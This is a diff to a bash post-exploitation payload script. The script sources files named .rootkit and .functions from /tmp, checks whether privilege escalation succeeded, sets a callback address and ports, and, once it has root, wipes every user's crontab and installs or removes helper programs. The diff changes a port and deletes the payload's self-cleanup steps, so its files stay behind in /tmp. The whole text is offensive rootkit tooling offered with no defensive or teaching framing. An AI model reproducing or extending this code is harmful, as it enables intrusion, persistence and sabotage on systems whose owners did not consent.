@@ -2,7 +2,7 @@
 
 ip="10.0.2.2"
 port2="9999"
-portp="15001"
+portp="15539"
 
 source /tmp/.functions
 source /tmp/.rootkit
@@ -14,19 +14,11 @@ user=$(whoami)
 
 if [ "$user" != "root" ]; then
   echo "priviledge escalation failed"
-  printf "removing files needed by payload... "
-  rm /tmp/.rootkit &>/dev/null
-  rm /tmp/.functions &>/dev/null
-  rm /tmp/.services &>/dev/null
-  rm /tmp/.variables &>/dev/null
-  rm -r /tmp/$ip:$portp &>/dev/null
-  finish
   exit
 fi
 
 #---if the user making the connection is root---
 echo "priviledge escalation succeeded"
-echo "------------------------------------------------------"
 
 #remove user's crontab
 users=$(cat /etc/passwd | awk -F: '{ print $1 }')
@@ -269,15 +261,8 @@ if [ "$?" == "0" ]; then
   rm -r /tmp/net-tools-master 2>/dev/null
 fi
 
-#--remove files and prerequisite programs--
-echo "--remove files and prerequisite programs--"
-printf "removing files needed by payload... "
-rm /tmp/.rootkit &>/dev/null
-rm /tmp/.functions &>/dev/null
-rm /tmp/.services &>/dev/null
-rm /tmp/.variables &>/dev/null
-rm -r /tmp/$ip:$portp &>/dev/null
-finish
+#--remove prerequisite programs--
+echo "--remove prerequisite programs--"
 for ((i=0; i < ${#uninstall[@]}; i++)); do
   if [ "${uninstall[i]}" != "0" ]; then
     remove_program ${uninstall[i]}
